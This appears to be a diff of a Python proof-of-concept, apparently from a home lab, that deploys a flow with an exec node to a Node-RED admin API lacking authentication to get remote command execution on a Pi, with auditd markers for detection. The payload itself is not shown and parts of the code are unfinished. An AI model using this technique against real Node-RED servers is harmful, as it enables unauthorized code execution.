@@ -39,7 +39,7 @@ while True:
 
 targetURL = f"http://{targetHost}:{targetPort}{targetTopic}"
 
-nodeConfirm_File = "/tmp/RCEnodeConfirm.txt"
+nodeConfirm_File = "/tmp/RCEnodeConfirm.txt" #evidence file spawned on Pi
 
 print(f"Target URL: {targetURL}")
 
@@ -98,12 +98,49 @@ def authCheck():
          print(f" Body: {r.text[:120]} \n")
          return True
     elif r.status_code == 401:
-        print(f"{ERROR} ")
+        print(f"{ERROR} {targetURL} returned '401' without credentials")
+        return False
+    else:
+        print(f"{WARNING} Unexpected status {r.status_code}")
 
-def deployFlow():
+def deployTarget_Flow():
+    headers = {
+        "Content-Type": "application/json",
+    }
+    body = json.dumps(flowPayload)
 
+    print(f"{NOTIFICATION} POST {targetURL}")
+    print(f"Content-Type: application/json")
+    print(f"authorization: disabled")
+    print(f"Payload: {len(flowPayload)} nodes")
+    f"(tab + inject + exec)"
+    print(f"Exec command: {flowPayload[2]['command']}\n")
+
+    try:
+        resp = requests.post(targetURL, headers=headers, data=body, timeout=10)
+    except requests.exceptions.ConnectionError:
+        print(f"{WARNING} Cannot reach {targetURL}")
+        print(f"Try: Check Pi state and services")
+        sys.exit(1)
+
+    print(f"{NOTIFICATION} Response: HTTP {resp.status_code} {resp.reason}")
+
+    if resp.status_code in (200, 204):
+        print(f"{NOTIFICATION} Flow deployment effective")
+        print(f"{NOTIFICATION} exec node firing...") 
+        print("auditd firing -k rce_marker + -k proc_exec")
+        return True
+    elif resp.status_code == 401:
+        print(f"{WARNING} 401 - adminAuth set. Try: 'grep adminAuth ~/.node-red/settings.js'")
+        return False
+    elif resp.status_code == 400:
+        print(f"{WARNING} 400 - Bad request. Note: JSON likely misconfigured.")
+        return False
+    else:
+        print(f"{WARNING} Unknown response {resp.status_code}: {resp.text[:200]}")
+        return False
 
 def RCEverify():
-
+    
 
 def main():
